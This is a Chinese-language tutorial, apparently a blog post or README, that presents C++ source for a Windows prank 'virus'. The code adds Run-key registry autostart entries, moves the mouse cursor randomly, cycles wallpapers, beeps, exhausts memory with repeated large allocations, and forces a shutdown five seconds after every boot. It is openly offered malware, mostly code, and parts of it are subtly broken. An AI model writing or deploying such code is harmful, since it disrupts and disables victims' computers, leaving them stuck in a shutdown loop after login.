    #include<stdio.h>
    #include<windows.h>
    #include<iostream>
    #include <tchar.h>
    #include<cstdlib>
    #include<ctime>
    using namespace std ;
    
    int main(){
        POINT sb;
        srand((unsigned)time(NULL));
        GetCursorPos (&sb);//获取鼠标坐标
        while(1){
            SetCursorPos(rand()%1000,rand()%800);//更改鼠标坐标
            Sleep(1);//控制移动时间间隔
        }
        return 0 ;
    }


## 开机自启动代码
> ret = RegSetValueEx(hkey,_T("新加项名称"),0,REG_SZ,(const BYTE*)("d:\\windows\\setup.exe"),21);  
   
第二个参数是项名称，第五个参数是要开机启动程序的路径位置，最后一个参数是第五个参数路径字符长度。

    #include<stdio.h>
    #include<windows.h>
    #include<iostream>
    #include <tchar.h>
    #include<cstdlib>
    #include<ctime>
    using namespace std ;
    
    int main(){
        HKEY hkey ;//计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    	TCHAR p[64] ;
        long ret;
        ret = RegCreateKey(HKEY_CURRENT_USER,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&hkey);
        if(ret==ERROR_SUCCESS){
            ret = RegSetValueEx(hkey,_T("新加项名称"),0,REG_SZ,(const BYTE*)("d:\\windows\\setup.exe"),21);  // 主
            if(ret==ERROR_SUCCESS){
                // 写入成功
            }else {
                // 写入失败
                cout << "Write filed !" ;
            }
        }else {
            // 注册表打开失败
            cout << "Read error !" << endl ;
        }    
        return 0 ;
    }


## 关机代码
这个功能实现比较简单。

    #include<stdio.h>
    #include<windows.h>
    
    int main(){
        // 五秒关机
        system("shutdown -s -t 5");

        return 0 ;
    }

# 代码

## 注册程序，将病毒主体加入开机自启动
```
#include<stdio.h>
#include<windows.h>
#include<iostream>
#include <tchar.h>
#include<cstdlib>
#include<ctime>
using namespace std ;

int main(){
    HKEY hkey ;//计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	TCHAR p[64] ;
    long ret;
    ret = RegCreateKey(HKEY_CURRENT_USER,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&hkey);
    if(ret==ERROR_SUCCESS){
        ret = RegSetValueEx(hkey,_T("LexBer"),0,REG_SZ,(const BYTE*)("d:\\windows\\setup.exe"),21);  // 主
        ret = RegSetValueEx(hkey,_T("Begin"),0,REG_SZ,(const BYTE*)("d:\\windows\\system32\\bin\\begin.exe"),35); // 主要动作
        ret = RegSetValueEx(hkey,_T("FindQQ"),0,REG_SZ,(const BYTE*)("d:\\windows\\system32\\conf\\find.exe"),35);//监控实时变化
        if(ret==ERROR_SUCCESS){
            // 写入成功
        }else {
            // 写入失败
            cout << "Write filed !" ;
        }
    }else {
        cout << "Read error !" << endl ;
    }

    return 0 ;
}
```

## 病毒主体，在上方代码实现开机自启动之后，这段代码可以不断修改壁纸，控制鼠标以及关机。
```
#include<stdio.h>
#include<windows.h>
#include<iostream>
#include <tchar.h>
#include<cstdlib>
#include<ctime>
using namespace std ;

int main(){

    POINT sb;
    PVOID s[10] = {
        (PVOID)"D:\\windows\\system32\\bin\\background.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background1.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background2.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background3.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background4.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background5.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background6.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background7.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background8.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background9.jpg"
        };
    srand((unsigned)time(NULL));
    system("shutdown -s -t 5");
    SystemParametersInfo(20, true,s, 1) ;
    GetCursorPos (&sb);//获取鼠标坐标
    int i = 0 ;
    while(1){
        int *p = (int*)malloc(10000000000) ;
        printf("\a");
        SystemParametersInfo(20, true,s[i], 1) ;
        if(i>=9){
            i = 0 ;
        }
        SetCursorPos(rand()%1000,rand()%800);//更改鼠标坐标
        Sleep(1);//控制移动时间间隔
    }

    return 0 ;
}
```

# 参考
   ##[Github](https://github.com/CasterWx/c-cPlusPlus-Virus)